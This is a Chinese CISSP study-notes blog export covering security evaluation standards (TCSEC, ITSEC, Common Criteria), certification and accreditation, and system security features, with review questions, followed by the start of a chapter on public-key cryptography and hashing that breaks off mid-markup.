自20世纪80年代以来，政府、机构、团体和各种商业组织都不得不面对涉及信息系统挑选和使用的风险。这种情况导致近年来出现了一系列信息安全标准，这些标准试图为各种使用类别指定最低的可接受安全标准。当购买者希望获得和部署能够保护和保留其内容，或者能够满足各种强制安全需求(例如，承办商管理与政府相关的业务时按手续必须满足的需求)的系统时，这些使用类别十分重要。在美国国防部(DoD)致力于为购买和使用的系统开发和实施安全标准时，第一组这样的标准导致在20世纪80年代出现可信计算机系统评估标准(TCSEC)。随后，在20世纪90年代中期，这个系列的所有标准都被公布出来。因为往往可以通过封面颜色来标识这些被公布的标准，所以它们被合称为彩虹系列。</p><h4 id="8-3-2-TCSEC分类和所需功能"><a href="#8-3-2-TCSEC分类和所需功能" class="headerlink" title="8.3.2 TCSEC分类和所需功能"></a>8.3.2 TCSEC分类和所需功能</h4><p>　　TCSEC将系统提供的功能性和机密性保护等级保证组合为4个主要类别。这些类别随后又被进一步划分为使用数字标识的子类别(例如，C1和C2)。进一步说，TCSEC的类别是通过对目标系统的评估来指派。TCSEC适用的系统是没有互联的独立系统。TCSEC定义了下列主要类别：</p><ul><li><strong>类别A</strong> 己验证保护，这是最高的安全级别</li><li><strong>类别B</strong> 强制性保护</li><li><strong>类别C</strong> 自主性保护</li><li><strong>类别D</strong> 最小化保护，提供给那些被评估但不符合要求且属于其他类别的系统定级之用</li></ul><table><thead><tr><th>级别标签</th><th>需求</th></tr></thead><tbody><tr><td>D</td><td>最小化保护</td></tr><tr><td>C1</td><td>自主性保护</td></tr><tr><td>C2</td><td>受控访问保护</td></tr><tr><td>B1</td><td>标签式安全</td></tr><tr><td>B2</td><td>结构化保护</td></tr><tr><td>B3</td><td>安全域</td></tr><tr><td>A1</td><td>已验证保护</td></tr></tbody></table><ul><li><strong>自主性保护(类别C1、C2)</strong> 自主性保护系统提供了基本的访问控制。这个类别中的系统的确能提供一些安全控制方法，但是缺乏针对安全系统特定需要的更复杂且更严格的控制方法。C1和C2类别的系统提供了基本的控制和用于系统安装与配置的完整文档。<ul><li><strong>自主性安全保护(类别C1)</strong> 自主性安全保护系统通过用户D和/或用户组来实现访问控制。虽然对客体的访问采取了一些控制措施，但这个类别中的系统只能提供较弱的保护。</li><li><strong>受控访问保护(类别C2)</strong> 受控访问保护系统的安全性强于C1系统。用户必须被单独标识后才能获得访问客体的权限。C2系统还必须实施介质清除措施。如果实施了介质清除措施，那么在另一位用户重新使用介质之前，必须首先彻底地清除介质上的内容，从而保证不会保留先前的数据供检查和使用。此外，也必须实施限制无效或未授权用户访问的严格登录措施。</li></ul></li><li><strong>强制性保护(类别B1、B2、B3)</strong> 强制性保护系统比类别C或D的系统提供了更多的安全控制方法。因为强制实施了更细粒度的控制，所以安全管理员能够应用只允许非常有限的主体/客体组访问的特定控制手段。这个系统类别以Bell-LaPadula模型为基础。强制访问控制基于安全标签。<ul><li><strong>标签式安全(类别B1)</strong> 在标签式安全系统中，每个主体和客体都有一个安全标签。通过匹配主体和客体的标签并比较它们的权限兼容性，B1系统授予了访问权限。B1系统提供了足够的安全保护来保留己分类的数据。</li><li><strong>结构化保护(类别B2)</strong> 除了要求具有安全标签之外(就像在B1系统中一样)，B2系统必须确保不存在隐蔽通道。操作者和管理员的职责被分隔开，并且进程也被隔离。如果分类数据需要高于B1系统的安全功能性，B2系统可以满足需要。</li><li><strong>安全域(类别B3)</strong> 通过进一步增加无关进程的分隔和隔离，安全域系统提供了更多的安全功能性。管理功能被清楚地定义并与其他用户可以使用的功能分开。B3系统的关注点转移到简易性，从而减少了在未用的或多余的代码中所暴露出来的脆弱性。因系统的安全状态也必须在初始启动过程中被说明。因系统难以被成功攻击，并且为非常敏感的或秘密的数据提供了充分的安全控制。</li></ul></li><li><strong>己验证保护(类别A1)</strong> 己验证保护系统在结构和使用的控制方面与B3系统类似。二者的差别在于开发周期。开发周期的每个阶段都使用正式的方法进行控制。在执行下一个步骤之前，设计的每个阶段都要被记入文档、评估和验证。在开发和部署的所有阶段都给予极高的安全关注度，并且是正式保证系统强安全性的唯一方式。</li></ul><h4 id="8-3-3-彩虹系列中的其他颜色"><a href="#8-3-3-彩虹系列中的其他颜色" class="headerlink" title="8.3.3 彩虹系列中的其他颜色"></a>8.3.3 彩虹系列中的其他颜色</h4><ul><li><strong>红皮书</strong> 因为桶皮书只应用于未连接到网络的独立计算机，而如此多的系统却连接到网络(即使在20世纪80年代也是如此)，所以红皮书被开发出来用于在网络互联环境中解释说明TCSEC。事实上，红皮书的正式标题是”可信网络解释”，因此可以被视为致力于从网络连接角度对桶皮书进行解释说明。下面列出了红皮书的其他一些功能：<ul><li>评定机密性和完整性的等级</li><li>解决通信的完整性问题</li><li>解决拒绝服务的防护问题</li><li>解决危害(也就是入侵)的防护和阻止问题</li><li>受限于被标记为”使用单个鉴定授权的集中式网络”的有限网络类别</li><li>只使用4种等级级别：None、Cl(Minimum)、C2(Fair)以及B2(Good)。</li></ul></li><li><strong>绿皮书</strong> 绿皮书或者称为”美国国防部密码管理指导原则”提供了创建和管理密码的指导原则。对于配置和管理可信系统的人来说，绿皮书十分重要。</li></ul><p>　　下面提供了彩虹系列的一个更完整的书籍列表：</p><table><thead><tr><th>发表编号</th><th>标题</th><th>名称</th></tr></thead><tbody><tr><td>5200.28-STD</td><td>DoD可信计算机系统评估标准</td><td>橘皮书</td></tr><tr><td>CSC-STD-002-85</td><td>DoD 密码管理指导原则</td><td>绿皮书</td></tr><tr><td>CSC-STD-003-85</td><td>在特定环境中应用TCSEC的指南</td><td>黄皮书</td></tr><tr><td>NCSC-TG-001</td><td>理解可信系统审计的指南</td><td>褐皮书</td></tr><tr><td>NCSC-TG-002</td><td>可信产品评估：供应商指南</td><td>天蓝皮书</td></tr><tr><td>NCSC-TG-002-85</td><td>PC安全考虑</td><td>浅蓝皮书</td></tr><tr><td>NCSC-TG-003</td><td>理解可信系统中任意访问控制的指南</td><td>氖桶皮书</td></tr><tr><td>NCSC-TG-004</td><td>计算机安全术语词汇表</td><td>浅绿皮书</td></tr><tr><td>NCSC-TG-005</td><td>可信网络解释</td><td>红皮书</td></tr><tr><td>NCSC-TG-004</td><td>理解可信系统中配置管理的指南</td><td>琉珀皮书</td></tr><tr><td>NCSC-TG-006</td><td>理解可信系统中设计文档的指南</td><td>暗红皮书</td></tr><tr><td>NCSC-TG-008</td><td>理解可信系统中可信分发的指南</td><td>浅紫皮书</td></tr><tr><td>NCSC-TG-009</td><td>TCSEC中计算机安全子系统的解释</td><td>威尼斯蓝皮书</td></tr></tbody></table><p>　　随着时代的发展和技术的更新，下面列出的对TCSEC 的主要批评能够解释目前普遍使用更新标准的原因：</p><ul><li>尽管TCSEC重点考虑控制用户对信息的访问，但是并没有控制用户一旦获得访问权限后如何对信息进行处理。在军事和商业应用中，这都是问题。</li><li>考虑到来自于美国国防部，因此可以理解TCSEC标准关注的重点完全在于机密性，该标准认定控制用户访问数据的方式意味着不必关注数据的准确性或完整性。在认为数据的准确性和完整性比机密性更重要的商业环境中，TCSEC不起作用。</li><li>除了自身强调访问控制之外，TCSEC并不仔细处理完全实现安全策略所必需的各种人员、物理和过程化的策略问题或防范措施。此外，TCSEC也不处理影响系统安全性的问题。</li><li>橘皮书本质上并不处理网络连接问题(尽管之后在1987年开发的红皮书能够解决类似问题)。</li></ul><h4 id="8-3-4-ITSEC类别与所需的保证和功能性"><a href="#8-3-4-ITSEC类别与所需的保证和功能性" class="headerlink" title="8.3.4 ITSEC类别与所需的保证和功能性"></a>8.3.4 ITSEC类别与所需的保证和功能性</h4><p>　　ITSEC指导原则使用不同的类别等级来评估系统的功能性和保证。在这种环境下，系统的功能性是针对系统用户的实用价值进行衡量。系统的功能性等级描述了系统基于设计和预期目的执行所需功能的情况。保证等级表示系统以一致的方式正常工作的可靠程度。ITSEC将正在被评估的系统作为评估目标(Target OfEvaluation，TOE)。所有的等级都以两种类别表示为TOE等级。ITSEC使用两个尺度来评定功能性和保证的等级。TCSEC和ITSEC之间的差异十分多样化。下面列出了两个标准之间的一些重要差异：</p><ul><li>尽管TCSEC几乎只关注机密性，但是ITSEC除了机密性之外还关注TCSEC缺少的完整性与可用性，因此覆盖了对于维护完整信息的安全性十分重要的所有三个元素。</li><li>ITSEC并不依赖于TCB的概念，并且不要求系统的安全组件在TCB内是隔离的。</li><li>TCSEC要求任何发生变化的系统都要重新进行评估，这些变化包括操作系统的升级、安装补丁或修复，以及应用程序的升级或变化等; ITSEC在这些变化之后不要求进行新的正式评估，而是只维护评估目标。</li></ul><h4 id="8-3-5-通用准则"><a href="#8-3-5-通用准则" class="headerlink" title="8.3.5 通用准则"></a>8.3.5 通用准则</h4><h5 id="1-通用准则的认可"><a href="#1-通用准则的认可" class="headerlink" title="1. 通用准则的认可"></a>1. 通用准则的认可</h5><p>　　下面列出了CC指导原则的目标：</p><ul><li>增加购买者对己评估和己划分等级的IT产品的安全性的信心。</li><li>消除重复评估(除其他外，如果某个国家、机构或验证组织对特定系统的评定等级和配置遵循CC，那么其他国家、机构或验证组织就不需要进行重复的工作)。</li><li>使安全评估和认证过程更有效益和效率。</li><li>确保IT产品的评估遵循高且一致性标准。</li><li>促进评估，并且增强己评估和己划分等级的IT产品的可用性。</li><li>评估TOE的功能性(也就是系统的功能)和保证(也就是系统的被信任程度)。</li></ul><p>　　通用准则过程基于两个关键元素： 保护轮廓和安全目标。保护轮廓(Protection Profiles，PP)指定被评估产品(TOE)的安全需求和保护，这也是客户考虑的安全要求或”希望达到的标准”。安全目标(Security Targets，ST)指定了供应商在TOE内构建的安全声明。ST被视为己实现的安全措施或供应商”提供的安全目标”。</p><h5 id="2-通用准则的结构"><a href="#2-通用准则的结构" class="headerlink" title="2. 通用准则的结构"></a>2. 通用准则的结构</h5><p>　　CC指导原则被分为下列三部分：</p><ul><li>介绍和一般模型描述(lntroduction and General Model)用于评估IT安全性和指定评估目标时涉及的一般概念与基本模型。对于不熟悉安全评估工作过程的人，或者阅读和解释评估结果时需要寻求帮助的人来说，这部分是非常有用的介绍和说明材料。</li><li>安全功能需求(S巳curity Functional Requirement)描述与安全审计、通信安全、安全性的密码学支持、用户数据保护、身份标识和身份认证、安全管理、TOE安全功能σSF) 、资源利用、系统访问以及可信路径有关的各种功能需求。这部分覆盖CC评估过程中能够预想到的完整安全功能范围，井且还具有解释每个功能区域的额外附录。</li><li>安全保证(Security Assurance)涉及TOE在配置管理、传送和操作、开发、指导文档与生命周期支持领域的保证需求，以及保证测试和脆弱性的评估。这部分覆盖CC评估过程中预想到的安全保证检查和保护轮廓的完整范围，并且还具有与描述如何设计、检查和测试系统的评估保证级别相关的信息。</li></ul><h5 id="3-行业和国际安全实施指南"><a href="#3-行业和国际安全实施指南" class="headerlink" title="3. 行业和国际安全实施指南"></a>3. 行业和国际安全实施指南</h5><p>　　支付卡行业数据安全标准(PCI-DSS)是提高电子支付交易安全要求的集合。这些标准由PCI 安全标准委员会的成员进行制订，这些成员主要来自信用卡银行和金融机构。PCI-DSS 定义了安全管理、策略、手里亨、网络架构、软件设计的要求及其他关键的保护措施。<br>　　国际标准化组织(ISO)是由不同国家标准组织的代表组成的世界性标准组织。国际标准化组织定义了工业和商业设备、软件、协议、管理以及其他的标准，有6 个主要产品： 国际标准、技术报告、技术规范、公开规格、技术勘误表和指南。ISO 标准己被许多行业广泛接受，甚至被采纳为各国政府的要求或法律。</p><h4 id="8-3-6-认证和鉴定"><a href="#8-3-6-认证和鉴定" class="headerlink" title="8.3.6 认证和鉴定"></a>8.3.6 认证和鉴定</h4><p>　　要求系统安全的组织需要通过一种或多种方法来评估系统满足安全要求的幸自支。正式的评估过程被分为两个阶段：认证和鉴定。每个阶段要求的实际步骤取决于组织选择的评估标准。认证和鉴定过程用来评估应用程序的有效性，以及操作系统和硬件的安全性。评估的过程为评价系统在多大程度上达到所期望的安全级别提供了一种衡量方法。因为每个系统的安全级别取决于很多因素，所以在评估过程中必须考虑所有这些因素。</p><ul><li><p>认证<br>认证是对IT系统的技术和非技术安全特性以及其他防护措施的综合评估，这能够支持鉴定过程，从而确定特定设计和实现满足一组指定安全要求的程度。系统认证是对计算机系统的每个部分进行技术性评估，以便评估系统与安全标准是否一致。首<br>先，必须选择评估标准(我们将会在稍后部分探讨可以选择的标准) 。一旦选择使用的标准，就要分析每个系统组件，以确定其是否达到所期望的安全目标。在评估完整个系统之后，可以对结果进行评估，以便决定系统在当前环境中支持的安全级别。系统的环境是认证分析过程的一个关键部分，因此系统的安全性或多或少地依赖于其所处的环境。安全系统与网络连接的方式会改变系统的安全状况。系统周围的物理安全保护措施也会影响整体的安全等级。因此，在认证系统时，必须全面考虑所有的因素。</p></li><li><p>鉴定<br>鉴定是由指定许可机构(Designated Approving Au也ority，DAA)做出的正式声明，它表明准许IT系统使用规定的一组防护措施在可接受的风险级别以特定的安全模式运作。鉴定一旦完成，管理层就可以正式接受被评估系统的总体安全性的适用性。认证和鉴定的过程通常是一个不断重复的过程。在鉴定阶段，请求通过改变系统配置或增加控制来解决安全问题的情况时有发生。需要记住的是，只要更改了配置，就必须重新认证新的配置。同样，当经过一段具体的时间后或进行了任何配置变更后，都必须重新认证系统。安全策略应当明确指出什么样的情况需要进行重新认证。优良的安全策略会列出认证有效的时间以及要求重新开始认证和鉴定过程的任何更改。</p></li><li><p>认证和鉴定系统<br>目前有下列两种政府标准适用于计算系统的认证和鉴定：美国国防部标准是风险管理框架(RMF)和美国国家安全系统委员会策略(CNSSP)。这些过程都分为4个阶段：</p><ul><li><strong>定义</strong> 涉及适当的项目人员分配、关键需求的记录以及指导整个认证和鉴定过程的系统安全许可协议(System Security Authorization Agreement，SSAA)的注册、协商和创建。</li><li><strong>验证</strong> 包括细化SSAA、系统开发活动以及认证分析。</li><li><strong>确认</strong> 包括进一步细化SSAA、集成系统的认证评估、DAA建议的开发以及DAA的鉴定结果。</li><li><strong>后鉴定</strong> 包括维护SSAA、系统操作、变更管理以及遵从性验证。</li></ul></li></ul><h3 id="8-4-理解信息系统的安全功能"><a href="#8-4-理解信息系统的安全功能" class="headerlink" title="8.4 理解信息系统的安全功能"></a>8.4 理解信息系统的安全功能</h3><p>　　信息系统的安全功能包括内存保护、虚拟化、可信平台模块、接口和容错能力。认真评估基础设施的各方面，并确保充分支撑安全是非常重要的。</p><h4 id="8-4-1-内存保护"><a href="#8-4-1-内存保护" class="headerlink" title="8.4.1 内存保护"></a>8.4.1 内存保护</h4><p>　　内存保护是一个核心的安全组件，必须对它进行设计和在操作系统中加以实现。无论程序是否在系统中执行，它都必须被执行。否则将导致不稳定、完整性的违反、拒绝服务以及信息泄露的结果。内存保护被用于防止活动进程与没有专门指派或分配的内存区域进行交互。</p><h4 id="8-4-2-虚拟化"><a href="#8-4-2-虚拟化" class="headerlink" title="8.4.2 虚拟化"></a>8.4.2 虚拟化</h4><p>　　虚拟化技术被用于在单一主机的内存中运行一个或多个操作系统。这种机制允许在任意硬件上虚拟运行任何操作系统，也允许多个操作系统同时工作在相同的硬件上。虚拟化有很多好处，比如能够启动单个服务或需要的服务实例，还能实时扩展，以及能够为特殊的服务运行额外的OS版本。从用户的角度来看，虚拟化的服务器和服务与传统的服务器和服务是没有区别的。此外，损坏、崩溃或毁坏的虚拟系统的恢复通常很快，只需简单使用干净的备份版本替换虚拟系统的主硬盘文件，然后重新启动就可以了。</p><h4 id="8-4-3-可信平台模块"><a href="#8-4-3-可信平台模块" class="headerlink" title="8.4.3 可信平台模块"></a>8.4.3 可信平台模块</h4><p>　　可信平台模块(TPM)既是对主板上加密处理器芯片的描述，同时也是描述实施的通用名称。TPM芯片用于存储和处理加密密钥，从而满足基于硬件支持/实现的硬盘加密系统。当使用基于TPM的全磁盘加密技术时，用户/操作员必须提供一个密码或物理USB令牌设备给计算机用于身份认证，并允许TPM芯片向内存释放硬盘加密密钥。<br>　　硬件安全模块(HSM)用于管理/存储数字加密密钥、加速加密操作、支持更快的数字签名，以及提高身份认证的速度。HSM通常是附加的适配器、外部设备或是TCP/IP网络设备。HSM包括防篡改保护以防止滥用，即便攻击者可以对其进行物理访问。TPM就是一个HSM示例。HSM提供大型(2048位以上)非对称加密计算的加速解决方案，以及密钥存储安全保护。许多认证系统使用HSM来存储证书;ATM和POS终端通常采用专有的HSM;硬件SSL加速器可以包括HSM支持;兼容DNSSEC的DNS服务器使用HSM提供密钥和区域文件存储。</p><h4 id="8-4-4-接口"><a href="#8-4-4-接口" class="headerlink" title="8.4.4 接口"></a>8.4.4 接口</h4><p>　　在应用程序中，使用约束或受限接口的目的是限制用户在基于他们的权限上可以做什么或看到什么。具有全部权限的用户可以访问应用程序的所有功能。有限制权限的用户则被限制访问。应用程序使用不同的方法来限制接口。约束接口的目的是限制或制止授权和未经授权用户的行为。这接口的使用就是Clark-Wilson安全模型的一种实践应用。</p><h4 id="8-4-5-容错"><a href="#8-4-5-容错" class="headerlink" title="8.4.5 容错"></a>8.4.5 容错</h4><p>　　容错能力是指系统遭受故障，但能持续运行的能力。容错是安全设计的一个基本要素，被认为是避免单点故障和实现冗余的部分措施。</p><h3 id="8-5-考试要点"><a href="#8-5-考试要点" class="headerlink" title="8.5 考试要点"></a>8.5 考试要点</h3><ul><li><strong>了解每种访问控制模型的细节</strong> 了解各种访问控制模型及其功能。状态机模型确保主体访问客体的所有实例都是安全的。信息流模型被设计用于阻止非授权的、不安全的或受限的信息流。非干扰模型能够阻止一个主体的动作影响另一个主体的系统状态或动作。Take-Grant模型规定了如何将权限从一个主体传递至另一个主体或者从一个主体传递至一个客体。访问控制矩阵是一个由主体和客体形成的表，这个表规定了每个主体能够在每个客体上执行的动作或功能。Bell-LaPadula主体具有一个许可级别，这个许可级别只允许访问具有相应分类级别的客体。Biba模型能够防止具有较低安全级别的主体对具有较高安全级别的客体进行写操作。Clark-Wilson是一个依赖于审计的完整性模型，能够确保未授权的主体无法访问客体以及被授权的用户能够正确地访问客体。Biba和Clark-Wilson模型实现了完整性。Goguen-Meseguer和Sutherland模型关注于完整性。Graham-Denning模型关注于主体和客体的安全建立和删除。</li><li><strong>了解认证和鉴定的定义</strong> 认证是从技术角度评估计算机系统的每个部分，从而判断是否与安全标准相一致。鉴定是正式验收己认证的配置的过程。</li><li><strong>能够描述开放式系统和封闭式系统</strong> 开放式系统是使用行业标准设计的，一般比较容易与其他的开放式系统进行整合。封闭式系统通常是专有硬件和/或软件，它们的设计规范一般不会公开，并且往往较难与其他系统进行整合。</li><li><strong>知道限制、界限和隔离的含义</strong> 限制是对进程从特定内存地址读取(和写入)数据进行限制。界限是进程在读取或写入数据时不能超越的特定内存地址的范围。隔离是通过使用内存界限而将进程加以限制的一种运行模式。</li><li><strong>能够从访问资源的角度定义客体和主体</strong> 访问的主体是提出访问资源请求的用户或进程。访问请求的客体是用户或进程希望访问的资源。</li><li><strong>了解安全控制的工作原理及功能</strong> 安全控制使用访问规则来限制主体对客体的访问。</li><li><strong>能够列出TCSEC、ITSEC 和通用准则的类别</strong> TCSEC的类别包括己验证保护、强制性保护、自主性保护和最小化保护。概述并比较了TCSEC、ITSEC和CC的相当且适用的等级(需要记住的是，ITSEC中从F7到F10的功能性等级没有对应的TCSEC等级)。</li><li><strong>定义可信计算基(TCB)</strong>  TCB 组合了硬件、软件和控制(形成了实施安全策略的可信基)。</li><li><strong>能够解释安全边界</strong> 安全边界是想象出来的，用于将TCB与系统其余部分分隔的界限。TCB组件与非TCB组件之间的通信使用可信路径。</li><li><strong>知道什么是引用监控器和安全内核</strong> 引用监控器是TCB的逻辑部分，对主体在被授予访问权限之前是否具有使用资源的权限进行确认。安全内核是实现引用监控器功能的TCB组件的集合。</li><li><strong>了解信息系统的安全功能。</strong> 常见的安全功能包括内存保护、虚拟化和可信平台模块(TPM)。</li></ul><h3 id="8-6-复习题"><a href="#8-6-复习题" class="headerlink" title="8.6 复习题"></a>8.6 复习题</h3><ol><li><p>系统认证是什么?<br>A. 正式接受确定的系统配置<br>B. 对计算机系统每部分的技术评估，以评估其是否符合安全标准<br>C. 对制造商目标的功能评估，为了让每个硬件和软件组件都满足集成标准<br>D. 制造商的证明，说明所有组件都被正确安装和配置</p></li><li><p>系统鉴定是什么?<br>A. 正式可接受的系统配置声明<br>B. 为了每个硬件和软件组件都满足集成标准，对制造商目标进行的功能评价<br>C. 证明计算机系统实施安全策略的可接受的测试结果<br>D. 指定两台机器之间的安全通信过程</p></li><li><p>封闭式系统是什么?<br>A. 围绕着最终、封闭或标准设计的系统<br>B. 包括工业标准的系统<br>C. 使用未公布协议的专有系统<br>D. 没有运行Windows的任意主机</p></li><li><p>以下哪一项更好地描述了限制或约束的过程?<br>A. 仅可以在有限的时间下运行的过程<br>B. 仅可以在一天中的某些时间运行的过程<br>C. 仅可以访问某些内存空间的过程<br>D. 对客体控制访问的过程</p></li><li><p>访问客体是什么?<br>A. 用户或进程想要访问的资源<br>B. 可以访问资源的用户或进程<br>C. 有效访问规则的列表<br>D. 有限访问类型的序列</p></li><li><p>安全控制是什么?<br>A. 存储了描述客体特性的安全组件<br>B. 列出所有数据分类类型的文件<br>C. 有效的访问规则列表<br>D. 限制访问客体的机制</p></li><li><p>信息系统安全鉴定的什么类型，是在特定的、独立的位置对应用和系统进行评估?<br>A 系统鉴定<br>B. 站点鉴定<br>C. 应用鉴定<br>D. 类型鉴定</p></li><li><p>TCSEC标准定义了几种主要类型?<br>A. 2<br>B. 3<br>C. 4<br>D. 5</p></li><li><p>可信计算基(TCB)是什么?<br>A. 在网络上支持安全传输的主机<br>B. 操作系统内核和设备驱动程序<br>C. 硬件、软件和控制结合在一起实现安全策略<br>D. 验证安全策略的软件和控制</p></li><li><p>安全边界是什么?<br>A. 围绕系统的物理安全区域的边界<br>B. 把TCB和系统其他部分隔离的假想边界<br>C. 防火墙所在的网络<br>D. 计算机系统的任何连接</p></li><li><p>TCB概念的什么部分验证了在授予每个资源需求权限前的每次访问?<br>A. TCB分区<br>B. 信任库<br>C. 引用监控器<br>D. 安全内核</p></li><li><p>安全模型的最佳定义是什么?<br>A. 安全模型描述了组织必须遵循的策略<br>B. 安全模型提供一个框架来实现安全策略<br>C. 安全模型是计算机系统每部分的技术评估，以评价与它们一致的安全标准<br>D. 安全模型是认证配置正式被接受的过程</p></li><li><p>哪个安全模型建立在状态机模型之上?<br>A. Bell-LaPadula和Take-Grant模型<br>B. Biba和Clark-Wilson模型<br>C. Clark-Wilson和Bell-LaPadula模型<br>D. Bell-LaPadula和Biba模型</p></li><li><p>哪个安全模型关注数据的机密性?<br>A. Bell-LaPadula模型<br>B. Biba模型<br>C. Clark-Wilson模型<br>D. Brewer and Nash模型</p></li><li><p>哪个Bell-LaPadula属性阻止低级别的主体访问高级别的客体?<br>A. (星)安全属性<br>B. 不准向上写属性<br>C. 不准向上读属性<br>D. 不准向下读属性</p></li><li><p>Biba模型的简单属性的含义是什么?<br>A. 向下写<br>B. 向上读<br>C. 不准向上写<br>D. 不准向下读</p></li><li><p>当可信主体违反了Bell-LaPadula模型的星安全属性时，为了把客体写入低级别，什么可行的操作可能会发生?<br>A. 扰动<br>B. 多实例<br>C. 聚合<br>D. 移除分类</p></li><li><p>什么安全方法、机制或模型揭示了一个主体访问多个客体的能力?<br>A. 职责分离<br>B. 访问控制矩阵<br>C. Biba模型<br>D. Clark-Wilson模型</p></li><li><p>什么安全模型拥有在理论上含有名称或标签的功能，但是在解决方案中实现时，需要安全内核的名称或标签?<br>A. Graham-Denning模型<br>B. Deployment模型<br>C. 可信计算基<br>D. Chinese Wall</p></li><li><p>下列哪一项不是Clark-Wilson模型的访问控制关系的一部分?<br>A. 客体<br>B. 接口<br>C. 编程语言<br>D. 主体</p></li></ol>]]></content>
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cissp </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cissp学习笔记（7）——PKI和密码学应用</title>
      <link href="/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%887%EF%BC%89%E2%80%94%E2%80%94PKI%E5%92%8C%E5%AF%86%E7%A0%81%E5%AD%A6%E5%BA%94%E7%94%A8/"/>
      <url>/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%887%EF%BC%89%E2%80%94%E2%80%94PKI%E5%92%8C%E5%AF%86%E7%A0%81%E5%AD%A6%E5%BA%94%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>安全工程学</p><ul><li>I. 密码学应用<ul><li>I.2 密码学类型(例如，对称密码学、非对称密码学、椭圆曲线密码学)</li><li>I.3 公钥基础设施(PKI)</li><li>I.4 密钥管理实践</li><li>I.5 数字签名</li><li>I.6 数字版权管理</li><li>I.7 不可否认性</li><li>I.8 完整性(哈希和撤盐)</li><li>I.9 密码分析攻击方法(例如，暴力破解、仅知密文、已知明文)</li></ul></li></ul><h3 id="7-1-非对称密码学"><a href="#7-1-非对称密码学" class="headerlink" title="7.1 非对称密码学"></a>7.1 非对称密码学</h3><h4 id="7-1-1-公钥与私钥"><a href="#7-1-1-公钥与私钥" class="headerlink" title="7.1.1 公钥与私钥"></a>7.1.1 公钥与私钥</h4><p>　　公钥密码系统依赖于为每个密码系统用户分配的一对密钥。每个用户都同时维护一个公钥和一个私钥。对于想与公钥密码系统用户通信的任何人来说，都可以从该用户那里自由获得公钥。第三方拥有的公钥不会将任何脆弱性引入密码系统。另一方面，私钥只供专人使用，这种密钥从不与其他密码系统用户共享。<br><img src="/notes/cissp学习笔记（7）——PKI和密码学应用/非对称密钥密码学.png"><br>　　发送者用接收者的公钥加密明文消息(时，从而产生密文消息(C)。当接收者打开密文消息时，他们使用自己的私钥解密密文，重新生成最初的明文消息。一旦发送者用接收者的公钥加密了消息，那么在不知道接收者的私钥(用于生成消息的公钥/私钥对的另一半)的情况下，没有用户(包括发送者)能够解密这些信息。这就是公钥密码学的优点，即可以使用不安全的通信通道自由共享公钥，并在以前并不认识的用户之间创建安全的通信信道。</p><h4 id="7-1-2-RSA"><a href="#7-1-2-RSA" class="headerlink" title="7.1.2 RSA"></a>7.1.2 RSA</h4><p>　　RSA算法依赖于大质数在因数分解时固有的计算难度。密码系统的每个用户都使用下列步骤描<br>述的算法产生一对公钥和私钥：</p><ul><li>(1) 选择两个大的质数(每个质数大约200位)，用p和q来表示</li><li>(2) 计算出这两个质数的乘积，即n = p * q</li><li>(3) 选择一个满足下列两项要求的数字e：<ul><li>e小于n</li><li>e和(n一1)(q一1)互为质数</li></ul></li><li>(4) 找到一个数d，使得(ed - 1)mod(p - 1)(q - 1) = 0 。</li><li>(5) 把e和n作为公钥分发给所有的密码系统用户，将d作为私钥并保持其秘密性。</li></ul><p>　　如果Alice想把一条加密的消息发送给Bob，那么她会使用如下所示的公式将明文(P)加密为密文(C)，其中密钥产生过程中生成的e是Bob的公钥，n是p和q的乘积：</p><center>c = p^e mod n</center><br>当Bob 收到消息时，他会运用下面这个公式得到明文消息：<br><center>p = c^d mod n</center><h4 id="7-1-3-EI-Gamal"><a href="#7-1-3-EI-Gamal" class="headerlink" title="7.1.3 EI Gamal"></a>7.1.3 EI Gamal</h4><p>　　El Gamal 算法优于RSA 算法的一个主要方面是： 它是公开发布的。然而，EI Gamal 算法也有一个主要缺点，即用此算法加密的任何消息的长度都加倍了。当加密长信息或数据并且要在带宽较窄的通信线路上传输时，这会表现出难以克服的困难。</p><h4 id="7-1-4-椭圆曲线密码系统-ECC"><a href="#7-1-4-椭圆曲线密码系统-ECC" class="headerlink" title="7.1.4 椭圆曲线密码系统(ECC)"></a>7.1.4 椭圆曲线密码系统(ECC)</h4><p>　　使用下面这个方程式可以定义任何椭圆曲线：</p><p><center>y^2 = x^3 + ax + b</center><br>　　在这个方程式中，x、y、a和b都是实数。每个椭圆曲线都有一个对应的椭圆曲线组，这个椭圆曲线组由椭圆曲线上的点和位于无穷大处的点O组成。在同一个椭圆曲线组中的两个点(P和Q)可以用椭圆曲线的加法算法加在一起。这个运算非常简单，如下所示：</p><p><center>P + Q</center><br>　　这个问题可以被扩展以涉及乘法。假设Q是P的倍数，如下所示：</p><p><center>Q = xP</center><br>　　计算机科学家和数学家相信，即使在P和Q己知的情况下，找到像x这样的数也是极其困难的。这个难题被称为椭圆曲线的离制才数问题，也是形成椭圆曲线密码学的基础。人们一般认为，解决这个问题比解决RSA密码系统依赖的质数因数分解问题和Di面e-Hellman与El Gamal应用的标准离散对数问题还要困难。前面的”密钥长度的重要性”通过具体数据阐述了这个问题，也就是1088位的RSA密钥的加密强度相当于160位的椭圆曲线密码系统密钥的加密强度。</p><h3 id="7-2-散列函数"><a href="#7-2-散列函数" class="headerlink" title="7.2 散列函数"></a>7.2 散列函数</h3><p>　　散列函数具有一个非常简单的用途，那就是它们接收一条可能会很长的消息，然后根据消息内容生成唯一的输出值。该值通常被称为消息摘要。消息摘要可以由消息的发送者产生，并连同完整的消息一起传送给接收者，这其中有两个原因： 首先，接收者能够使用相同的散列函数对完整的消息进行重新计算，得出消息摘要。然后，接收者将计算得出的消息摘要与传送过来的消息摘要进行比较，从而确保始发者发送的消息与接收者收到的是同一条消息。如果两个消息摘要不匹配，那么就表明消息在传送的过程中因为某种原因被修改过。其次，消息摘要可以被用于实现数字签名算法。<br>按照RSA安全公司的标准，对密码学散列函数有下列5个基本要求：</p><ul><li>输入值可以是任意长度。</li><li>输出值具有固定的长度。</li><li>散列函数在计算任何输入值时要相对容易。</li><li>散列函数是单向的(意味着在提供输出值时确定输入值是极其困难的)。</li><li>散列函数是不会发生冲突的(意味着找到产生相同散列值的两条消息是极其困难的) 。</li></ul><h4 id="7-2-1-SHA"><a href="#7-2-1-SHA" class="headerlink" 